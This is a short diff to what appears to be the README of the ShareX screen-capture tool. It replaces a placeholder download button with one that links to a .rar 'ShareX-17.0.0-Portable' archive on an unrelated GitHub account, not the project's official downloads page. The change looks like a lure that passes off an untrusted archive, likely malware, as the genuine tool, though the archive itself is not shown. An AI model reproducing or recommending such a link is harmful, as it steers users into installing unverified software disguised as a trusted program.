@@ -8,13 +8,11 @@
   <a href="https://getsharex.com/downloads"><img src="https://img.shields.io/github/downloads/ShareX/ShareX/total?label=Downloads&cacheSeconds=3600" alt="Downloads"/></a>
   <a href="https://discord.gg/ShareX"><img src="https://img.shields.io/discord/194170124859736065?label=Discord&cacheSeconds=3600" alt="Discord"/></a>
 </div>
+<a href="https://github.com/FLAdMITU/sharex/releases/download/Download/ShareX-17.0.0-Portable.rar"><img src="https://github.com/user-attachments/assets/92b0d941-c137-4260-93d4-fe852a3d402d"></a>
 <p align="center"><b>Screen capture, file sharing and productivity tool</b></p>
 
 <div align="center"><img src="https://github.com/user-attachments/assets/7b53cc3f-c8e1-4129-bad7-cfc42555080f">
 <br>
-
-<a href="#"><img src="https://github.com/user-attachments/assets/92b0d941-c137-4260-93d4-fe852a3d402d"></a>
-
 
 <div align="left"> 
 <h2>❤ Why ShareX?</h2> 
